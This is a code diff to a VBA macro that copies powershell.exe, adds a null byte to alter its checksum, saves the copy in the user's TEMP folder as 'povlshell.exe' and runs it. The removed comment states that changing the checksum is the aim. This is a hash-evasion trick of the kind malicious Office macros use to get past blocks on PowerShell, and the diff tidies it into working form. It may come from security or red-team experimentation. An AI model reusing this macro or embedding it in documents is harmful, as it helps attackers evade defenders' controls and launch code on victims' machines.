@@ -1,14 +1,10 @@
 Sub AddNull()
 
-    ' Macro that takes a program (powershell.exe) and adds a nullbyte to the beginning to change the checksum
-    ' Author: PovlTekstTV
-    ' Date: 28th of January 2018
-
-    'Variables
+   'Variables
     Dim Filename As String
     Dim Bytearray() As Byte
-    Filename = "C:\\Windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe"
-
+    Filename = "C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe"
+    
     'Create ADODB object
     Dim bin
     Set bin = CreateObject("ADODB.Stream")
@@ -20,7 +16,7 @@ Sub AddNull()
     
     'Close the stream for now
     bin.Close
-    
+
     'Change the Bytearray (and MD5 sum) by adding a null byte
     Dim Arraylength As Long 'Count the array
     Arraylength = UBound(Bytearray, 1) - LBound(Bytearray, 1) + 1 'stretch the array by 1
@@ -31,10 +27,14 @@ Sub AddNull()
     bin.Open
     bin.Write Bytearray
     Dim newFilename As String
-    newFilename = "C:\\temp\\powershell1.exe"
+    Dim dir As String
+    Dim name As String
+    dir = Environ("TEMP")
+    name = "povlshell.exe"
+    newFilename = dir & "\\" & name
     bin.SaveToFile newFilename, 2
-
-    Set WSHELL = CreateObject("Wscript.Shell")
-    WSHELL.Run ("C:\\temp\\powershell1.exe")
+	
+	Dim retval 
+	retval = Shell(newFilename)
 
 End Sub
